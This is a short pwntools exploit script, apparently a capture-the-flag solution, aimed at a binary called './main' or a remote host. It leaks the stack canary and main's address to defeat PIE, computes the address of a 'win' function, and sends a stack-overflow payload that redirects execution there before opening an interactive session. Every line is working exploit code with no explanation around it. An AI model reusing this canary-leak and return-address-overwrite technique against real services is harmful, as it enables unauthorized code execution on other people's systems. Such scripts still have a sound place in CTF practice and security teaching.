from pwn import *

BINARY_PATH = "./main"

def conn():
  if len (sys.argv) == 3:
    p = remote(sys.argv[1], int(sys.argv[2]))
  else:
    p = process(BINARY_PATH)
  return p

p = conn()
elf = ELF(BINARY_PATH)

def send(s, len=1000):
  p.sendlineafter(b': ', s)
  p.sendlineafter(b': ', str(len).encode())
  return p.recvuntil(b'\nPattern')[:-8]

# 1. Leak the canary
canary = b'\x00' + send(b'A' * 7)[-8:-1]
print(f"Canary : {canary[::-1].hex()}")

# 2. Get the main function's address for PIR Leak
main_addr = int.from_bytes(send(b'A' * 43)[-6:], 'little')
print(f"Main Address :{main_addr : x}")

# 3. Calculate win function's address
win_addr = main_addr - elf.symbols['main'] + elf.symbols['win']
print(f"Win Address :{win_addr : x}")

# 4. pwn
#send(b'A' * 8 + canary + b"B" * 8 + p64(win_addr + 5))
send(b"A" * 1 + canary + b"B" * 8 + p64(main_addr + 558) + p64(win_addr) + b"C" * 4)

p.sendlineafter(b': ', b'a')
p.sendlineafter(b': ', b'1001')
p.interactive()
